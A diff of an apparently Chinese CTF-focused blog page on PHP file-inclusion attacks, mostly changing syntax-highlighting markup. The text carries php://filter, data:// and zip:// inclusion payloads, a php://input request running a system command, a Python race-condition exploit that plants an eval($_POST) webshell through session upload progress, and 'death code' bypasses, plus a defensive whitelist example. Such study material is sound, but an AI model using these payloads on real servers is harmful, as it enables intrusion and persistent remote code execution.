@@ -17,13 +17,6 @@
 <script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
 
 
-<script src="https://cdn.staticfile.org/highlight.js/11.7.0/highlight.min.js"></script>
-<link
-    rel="stylesheet"
-    href="https://cdn.staticfile.org/highlight.js/11.7.0/styles/Github.min.css"
-/>
-<script src="/blog/js/lib/highlight.js"></script>
-
 
 
 <script src="/blog/js/lib/preview.js"></script>
@@ -211,7 +204,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Web/" style="color: #03a9f4">Web</a>
+                <a href="/blog/tags/Web/" style="color: #00a596">Web</a>
             </span>
             
         </span>
@@ -237,11 +230,15 @@
 <p>注：<strong>任何类型</strong>的文件，只要其中含有合法PHP代码，PHP就可以包含并执行；如果没有，就会以纯文本形式显示文件中的内容</p>
 <hr>
 <h2 id="直接读取"><a href="#直接读取" class="headerlink" title="直接读取"></a>直接读取</h2><p>测试直接读取有无回显</p>
-<pre><code class="powershell">/etc/passwd
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token operator">/</span>etc/passwd
 是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作
 
-/var/www/html+文件名
-</code></pre>
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www/html+文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
 <hr>
 <h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a><a id=1 ><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">php伪协议</a></a></h2><p><strong>php.ini配置文件参数：</strong></p>
 <p><code>allow_url_fopen：on </code>#默认开启 ，表示允许url里的封装协议访问文件；</p>
@@ -255,7 +252,7 @@
 <blockquote>
 <p><strong>读取文件源码</strong>可以直接用resource读取(常用)</p>
 </blockquote>
-<pre><code class="php">//原型
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">//原型
 php://filter/resource=flag.php
 
 //base64编码
@@ -268,11 +265,11 @@ php://filter/read=string.rot13/resource=flag.php
 //字符编码
 php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
 //解码脚本
-&lt;?php
-$str = &quot;lfga= \&quot; lfgaL&#123;xx&#125;x;\&quot;&quot;;
-echo iconv(&#39;UCS-2BE&#39;, &#39;UCS-2LE&#39;, $str);
-?&gt;
-</code></pre>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"lfga= \" lfgaL&#123;xx&#125;x;\""</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'UCS-2BE'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'UCS-2LE'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>写入文件源码需把read改为write，encode改为decode</p>
 </li>
 </ul>
@@ -295,8 +292,9 @@ echo iconv(&#39;UCS-2BE&#39;, &#39;UCS-2LE&#39;, $str);
 <p>访问数据流，执行相应php代码</p>
 </blockquote>
 <p> 可用于flag被过滤的文件包含</p>
-<pre><code class="php">data://text/plain(;base64),编码后的php代码 
-</code></pre>
+ <pre class="line-numbers language-php" data-language="php"><code class="language-php">data<span class="token punctuation">:</span><span class="token comment">//text/plain(;base64),编码后的php代码 </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
 <p>​    </p>
 <h3 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><blockquote>
 <p><strong>可读取本地文件</strong></p>
@@ -306,15 +304,17 @@ echo iconv(&#39;UCS-2BE&#39;, &#39;UCS-2LE&#39;, $str);
 <li><code>allow_url_fopen</code>:off&#x2F;on</li>
 <li><code>allow_url_include</code> :off&#x2F;on</li>
 </ul>
-<pre><code class="php">file://[文件的绝对路径和文件名]
-http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">//[文件的绝对路径和文件名]</span>
+http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span>
 
-file://[文件的相对路径和文件名]
-http://127.0.0.1/include.php?file=./phpinfo.txt
+file<span class="token punctuation">:</span><span class="token comment">//[文件的相对路径和文件名]</span>
+http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/include.php?file=./phpinfo.txt</span>
 
-http://[网络路径和文件名]
-http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
-</code></pre>
+http<span class="token punctuation">:</span><span class="token comment">//[网络路径和文件名]</span>
+http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h3 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;协议</h3><blockquote>
 <p><code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等</p>
 </blockquote>
@@ -323,18 +323,24 @@ http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
 <li><code>allow_url_fopen</code>:off&#x2F;on</li>
 <li><code>allow_url_include</code> :off&#x2F;on</li>
 </ul>
-<pre><code class="php">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]
-http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
-压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">zip<span class="token punctuation">:</span><span class="token comment">//[压缩文件绝对路径]%23[压缩文件内的子文件名]</span>
+http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span>
+压缩 phpinfo<span class="token operator">.</span>txt 为 phpinfo<span class="token operator">.</span>zip ，压缩包重命名为 phpinfo<span class="token operator">.</span>jpg ，并上传
 
-compress.bzip2://file.bz2
-http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
-压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）
+compress<span class="token operator">.</span>bzip2<span class="token punctuation">:</span><span class="token comment">//file.bz2</span>
+http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span>
+压缩 phpinfo<span class="token operator">.</span>txt 为 phpinfo<span class="token operator">.</span>bz2 并上传（同样支持任意后缀名）
 
-compress.zlib://file.gz
-http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
-压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）
-</code></pre>
+compress<span class="token operator">.</span>zlib<span class="token punctuation">:</span><span class="token comment">//file.gz</span>
+http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span>
+压缩 phpinfo<span class="token operator">.</span>txt 为 phpinfo<span class="token operator">.</span>gz 并上传（同样支持任意后缀名）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+
+
 <hr>
 <h2 id="Apache日志文件"><a href="#Apache日志文件" class="headerlink" title="Apache日志文件"></a><a id=2>Apache日志文件</a></h2><ul>
 <li><p><strong>access.log</strong></p>
@@ -393,13 +399,14 @@ http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\ph
 </ul>
 </li>
 <li><p>伪协议php:&#x2F;&#x2F;input控制输出流：（BurpSuite）</p>
-<pre><code class="php+HTML">GET /file_include/index.php?jumpTo=php://input HTTP/1.1
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">GET &#x2F;file_include&#x2F;index.php?jumpTo&#x3D;php:&#x2F;&#x2F;input HTTP&#x2F;1.1
 Host: 127.0.0.1
 ......
 Sec-Fetch-User: ?1
 
-&lt;?php system(&quot;ipconfig/all&quot;); ?&gt;
-</code></pre>
+&lt;?php system(&quot;ipconfig&#x2F;all&quot;); ?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>此时把显示主机IP地址信息的命令“输入”到了PHP中</p>
 </li>
 </ul>
@@ -459,77 +466,80 @@ Sec-Fetch-User: ?1
 </li>
 </ul>
 <p>exp:</p>
-<pre><code class="python">import requests
-import io
-import threading
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> io
+<span class="token keyword">import</span> threading
 
-url = &#39;http://6f7113f0-473f-406d-90a6-0cdbbdfacb48.challenge.ctf.show/&#39;    # 改成自己的url
-sessionid = &#39;truthahn&#39;      # 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahn
-cookies = &#123;
-            &#39;PHPSESSID&#39;:sessionid
-        &#125;
+url <span class="token operator">=</span> <span class="token string">'http://6f7113f0-473f-406d-90a6-0cdbbdfacb48.challenge.ctf.show/'</span>    <span class="token comment"># 改成自己的url</span>
+sessionid <span class="token operator">=</span> <span class="token string">'truthahn'</span>      <span class="token comment"># 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahn</span>
+cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessionid
+        <span class="token punctuation">&#125;</span>
 
-def write(session):		# write()函数用于写入session临时文件
-    fileBytes = io.BytesIO(b&#39;a&#39;*1024*50)    # 设置上传文件的大小为50k
-    data2 = &#123;
-        &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?=eval($_POST[1])?&gt;&#39;    # 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?&gt; 实现一句话
-    &#125;
-    files = &#123;
-        &#39;file&#39;:(&#39;truthahn.jpg&#39;,fileBytes)
-    &#125;
-    while True:    
-        res = session.post(url,data=data2,cookies=cookies,files=files)
-        # print(res.text)
-        #print(&#39;======= write done! ======&#39;)
+<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>		<span class="token comment"># write()函数用于写入session临时文件</span>
+    fileBytes <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token comment"># 设置上传文件的大小为50k</span>
+    data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?=eval($_POST[1])?>'</span>    <span class="token comment"># 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?> 实现一句话</span>
+    <span class="token punctuation">&#125;</span>
+    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'truthahn.jpg'</span><span class="token punctuation">,</span>fileBytes<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    
+        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+        <span class="token comment"># print(res.text)</span>
+        <span class="token comment">#print('======= write done! ======')</span>
 
-def read(session): 		# read()函数利用session临时文件生成一句话木马，实现rce
-    data1 = &#123;
-        &quot;1&quot;:&quot;file_put_contents(&#39;/var/www/html/3.php&#39;,&#39;&lt;?=eval($_POST[2]);?&gt;&#39;);&quot;     # 使用file_put_contents()php内置函数生成名为3.php的shell文件
-    &#125;
-    while True:
-        res = session.post(url+&#39;?file=/tmp/sess_&#39;+sessionid,data=data1,cookies=cookies)
-        # print(res.text)
-        res2 = session.get(url+&#39;3.php&#39;)
-        # print(res2.text)
-        if res2.status_code == 200:     #若3.php成功生成，则返回Done!，否则返回失败的状态码
-            print(&#39;++++++++ Done! +++++++++&#39;)
-        else:
-            print(res2.status_code)
+<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span> 		<span class="token comment"># read()函数利用session临时文件生成一句话木马，实现rce</span>
+    data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"1"</span><span class="token punctuation">:</span><span class="token string">"file_put_contents('/var/www/html/3.php','&lt;?=eval($_POST[2]);?>');"</span>     <span class="token comment"># 使用file_put_contents()php内置函数生成名为3.php的shell文件</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?file=/tmp/sess_'</span><span class="token operator">+</span>sessionid<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
+        <span class="token comment"># print(res.text)</span>
+        res2 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'3.php'</span><span class="token punctuation">)</span>
+        <span class="token comment"># print(res2.text)</span>
+        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>     <span class="token comment">#若3.php成功生成，则返回Done!，否则返回失败的状态码</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'++++++++ Done! +++++++++'</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
 
-if __name__ == &#39;__main__&#39;:
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
 
-    event = threading.Event()       
-    with requests.session() as session:     # 为每个函数设置5个线程并发执行
-        for i in range(5):
-            #print(&#39;*&#39;*50)
-            threading.Thread(target=write,args=(session,)).start()
-        for i in range(5):
-            #print(&#39;=&#39;*50)
-            threading.Thread(target=read,args=(session,)).start()
+    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>       
+    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>     <span class="token comment"># 为每个函数设置5个线程并发执行</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment">#print('*'*50)</span>
+            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment">#print('='*50)</span>
+            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-    event.set()
-</code></pre>
+    event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <hr>
 <h2 id="绕过死亡代码"><a href="#绕过死亡代码" class="headerlink" title="绕过死亡代码"></a><a id=7><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-3">绕过死亡代码</a></a></h2><blockquote>
 <p>原型</p>
 </blockquote>
-<pre><code class="php">1. file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">1. file_put_contents($filename,"&lt;?php exit();".$content);
 
-2. file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);
+2. file_put_contents($content,"&lt;?php exit();".$content);
 
-3. file_put_contents($filename,$content . &quot;\nxxxxxx&quot;);
-</code></pre>
+3. file_put_contents($filename,$content . "\nxxxxxx");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <ol>
 <li><ul>
 <li><p><strong>base64编码绕过</strong></p>
 <p>利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别</p>
 </li>
 </ul>
-<pre><code class="php">$filename=&#39;php://filter/write=convert.base64-decode/resource=1.php&#39;;
-$content = &#39;aPD9waHAgcGhwaW5mbygpOz8+&#39;;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource=1.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aPD9waHAgcGhwaW5mbygpOz8+'</span><span class="token punctuation">;</span>
 
-$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit/phpdie参与了解码，所以补上一位就可以完全转化
-</code></pre>
+<span class="token variable">$content</span>加了一个a，是因为base64在解码的时候是将<span class="token number">4</span>个字节转化为<span class="token number">3</span>个字节，又因为死亡代码只有phpexit<span class="token operator">/</span>phpdie参与了解码，所以补上一位就可以完全转化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <ul>
 <li><p><strong>rot13编码绕过</strong></p>
 <p>原理和base64一样，可以直接转码分解死亡代码</p>
@@ -543,12 +553,12 @@ $content加了一个a，是因为base64在解码的时候是将4个字节转化�
 <p>利用 .htaccess的预包含文件的功能来进行攻破；自定义包含我们的flag文件</p>
 </li>
 </ul>
-<pre><code class="php">$filename=php://filter/write=string.strip_tags/resource=.htaccess
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/write=string.strip_tags/resource=.htaccess</span>
 
-$content=?&gt;php_value%20auto_prepend_file%20G:\s1mple.php
+<span class="token variable">$content</span><span class="token operator">=</span><span class="token operator">?</span><span class="token operator">></span>php_value<span class="token operator">%</span><span class="token number">20</span>auto_prepend_file<span class="token operator">%</span><span class="token number">20</span>G<span class="token punctuation">:</span>\s1mple<span class="token operator">.</span>php
     
-首先来解释$filename的代码，这里引用了string.strip_tags过滤器，可以过滤.htaccess内容的html标签，自然也就消除了死亡代码；$content即闭合死亡代码使其完全消除，并且写入自定义包含文件
-</code></pre>
+首先来解释<span class="token variable">$filename</span>的代码，这里引用了<span class="token keyword type-declaration">string</span><span class="token operator">.</span>strip_tags过滤器，可以过滤<span class="token operator">.</span>htaccess内容的html标签，自然也就消除了死亡代码；<span class="token variable">$content</span>即闭合死亡代码使其完全消除，并且写入自定义包含文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <blockquote>
 <p>但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜  flag.php flag   &#x2F;flag  &#x2F;flag.php  等等；另外还有个很大的问题是，string.strip_tags过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器</p>
 </blockquote>
@@ -569,49 +579,48 @@ $content=?&gt;php_value%20auto_prepend_file%20G:\s1mple.php
 <li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wuyt2008/article/details/8282310"><strong>更改Apache日志路径</strong></a></p>
 </li>
 <li><p><strong>写死包含的路径或文件名</strong></p>
-<pre><code class="php+HTML">&lt;?php
-    header(&quot;Content-type:text/html;charset=utf-8&quot;);
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
+    header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);
     error_reporting(E_ERROR); 
     ini_set(&quot;display_errors&quot;,&quot;Off&quot;);
-    $link=$_GET[&#39;jumpTo&#39;];
+    $link&#x3D;$_GET[&#39;jumpTo&#39;];
     if (isset($link)) &#123;
         switch ($link) &#123;
             case &#39;job&#39;:
-                include(&#39;./jobs.php&#39;);
+                include(&#39;.&#x2F;jobs.php&#39;);
                 break;
             case &#39;hobby&#39;:
-                include(&#39;./hobby.php&#39;);
+                include(&#39;.&#x2F;hobby.php&#39;);
                 break;
             default:
                 die(&quot;风雪的缩影，如琉璃般飘落......&quot;);
                 break;
         &#125;
     &#125; else &#123;
-        // Do nothing.    
+    	&#x2F;&#x2F; Do nothing.    
     &#125;
 ?&gt;
 
 &lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
+&lt;html lang&#x3D;&quot;en&quot;&gt;
 &lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
-    &lt;title&gt;王小美の主页&lt;/title&gt;
-&lt;/head&gt;
+    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
+    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;
+    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;
+    &lt;title&gt;王小美の主页&lt;&#x2F;title&gt;
+&lt;&#x2F;head&gt;
 &lt;body&gt;
-    &lt;h1 style=&quot;text-align: center;&quot;&gt;个人主页&lt;/h1&gt;
+    &lt;h1 style&#x3D;&quot;text-align: center;&quot;&gt;个人主页&lt;&#x2F;h1&gt;
     &lt;br&gt;
-    &lt;img src=&quot;./img/ganyu.png&quot;&gt;
+    &lt;img src&#x3D;&quot;.&#x2F;img&#x2F;ganyu.png&quot;&gt;
     &lt;br&gt;
-    &lt;p&gt;Name: 甘雨&lt;/p&gt;&lt;br&gt;
-    &lt;p&gt;Age: 3000+&lt;/p&gt;&lt;br&gt;
-    &lt;p&gt;我是女生&lt;/p&gt;&lt;br&gt;
-    &lt;a href=&quot;./index.php?jumpTo=job&quot;&gt;我的工作&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;./index.php?jumpTo=hobby&quot;&gt;我的兴趣爱好&lt;/a&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-</li>
+    &lt;p&gt;Name: 甘雨&lt;&#x2F;p&gt;&lt;br&gt;
+    &lt;p&gt;Age: 3000+&lt;&#x2F;p&gt;&lt;br&gt;
+    &lt;p&gt;我是女生&lt;&#x2F;p&gt;&lt;br&gt;
+    &lt;a href&#x3D;&quot;.&#x2F;index.php?jumpTo&#x3D;job&quot;&gt;我的工作&lt;&#x2F;a&gt;&amp;nbsp;&amp;nbsp;&lt;a href&#x3D;&quot;.&#x2F;index.php?jumpTo&#x3D;hobby&quot;&gt;我的兴趣爱好&lt;&#x2F;a&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 
     </div>
